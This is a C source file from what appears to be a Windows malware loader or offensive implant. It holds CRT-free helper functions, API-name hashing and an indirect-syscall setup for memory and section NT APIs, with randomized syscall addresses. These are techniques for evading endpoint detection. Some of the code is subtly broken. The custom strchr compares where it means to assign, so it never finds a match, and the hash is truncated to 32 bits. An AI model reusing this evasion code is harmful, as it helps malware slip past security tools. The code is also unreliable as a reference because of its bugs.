

#include <Windows.h>
#include "Common.h"
#include "Structs.h"
#include "Debug.h"



UINT32 CityHash(LPCSTR cString)
{
    int length = strlen(cString);
    UINT64 hash = FIRST_HASH;

    for (size_t i = 0; i < length; ++i) {
        hash ^= (UINT64)cString[i];
        hash *= SECOND_HASH;
    }

    hash ^= hash >> HASH_OFFSET;
    hash *= THIRD_HASH;
    hash ^= hash >> HASH_OFFSET;

    return hash;
}

UINT32 GernerateRandomInt()
{
    static UINT32 state = 987654321;
    state ^= state << 12;
    state ^= state >> 15;
    state ^= state << 5;
    return state;
}

VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource)
{
    while (*pDest != 0) {
        pDest++;
    }

    while (*pSource != 0) {
        *pDest = *pSource;
        *pDest++;
        *pSource++;
    }

    *pDest = 0;
}

VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength)
{
    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--) {
        *D++ = *S++;
    }
}

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget)
{
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0)
    {
        *p++ = (unsigned char)value;
    }

    return pTarget;
}

extern void* __cdecl strchr(const char*, int);

#pragma intrinsic(strchr)
#pragma function(strchr)
void* __cdecl strchr(const char* str, int c)
{
    char* last = NULL;
    while (*str)
    {
        if (*str == c) {
            last == (char*)str;
        }
        str++;
    }
    return last;
}

typedef struct
{
    UINT32          FunctionCH;
    PLAMIA_SYSCALL  pLamiaSyscall;
    const char* FunctionName;
} NT_SYSCALL_INFO;

BOOL InitialIndirectSyscall(OUT PNT_API NtApi)
{
    if (NtApi->bInit) {
        return TRUE;
    }

    NT_SYSCALL_INFO syscallInfos[] = {
        {NtOpenSection_CH, &NtApi->NtOpenSection, "NtOpenSection"},
        {NtMapViewOfSection_CH, &NtApi->NtMapViewOfSection, "NtMapViewOfSection"},
        {NtProtectVirtualMemory_CH, &NtApi->NtProtectVirtualMemory, "NtProtectVirtualMemory"},
        {NtUnmapViewOfSection_CH, &NtApi->NtUnmapViewOfSection, "NtUnmapViewOfSection"},
        {NtAllocateVirtualMemory_CH, &NtApi->NtAllocateVirtualMemory, "NtAllocateVirtualMemory"},
        {NtDelayExecution_CH, &NtApi->NtDelayExecution, "NtDelayExecution"},
    };

    for (size_t i = 0; i < sizeof(syscallInfos) / sizeof(syscallInfos[0]); i++) {
        if (!FetchLamiaSyscall(syscallInfos[i].FunctionCH, syscallInfos[i].pLamiaSyscall))
        {
#ifdef DEBUG
            PRINT("[!] Failed To Initialize \"%s\" - %s.%d \n",
                syscallInfos[i].FunctionName, GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }
    }

#ifdef DEBUG
    for (size_t i = 0; i < sizeof(syscallInfos) / sizeof(syscallInfos[0]); i++) {
        PRINT("[V] %s [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n",
            syscallInfos[i].FunctionName, syscallInfos[i].pLamiaSyscall->SSN, syscallInfos[i].pLamiaSyscall->pSyscallRandomAdr);
    }
#endif

    NtApi->bInit = TRUE;
    return TRUE;
}

extern void* __cdecl strrchr(const char*, int);

#pragma intrinsic(strrchr)
#pragma function(strrchr)
char* strrchr(const char* str, int c) {
    char* last_occurrence = NULL;
    while (*str) {
        if (*str == c) {
            last_occurrence = (char*)str;
        }
        str++;
    }

    return last_occurrence;
}